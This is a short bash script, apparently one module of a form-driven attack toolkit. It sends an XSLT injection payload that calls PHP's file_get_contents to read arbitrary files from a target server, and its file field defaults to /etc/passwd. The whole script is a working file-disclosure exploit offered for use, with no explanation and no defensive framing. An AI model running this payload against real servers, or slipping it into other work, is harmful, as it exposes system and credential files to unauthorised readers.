#!/bin/bash

: '
XSLT - lfi dump file using php
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
FILE_FIELD=$(form_item "read file" "file" "/etc/passwd")

# Generate GUI form
generate_form "${FILE_FIELD}"

FILE=${form_data["file"]}

execute_command "<xsl:value-of select=\"php:function('file_get_contents','${FILE}')\" />"
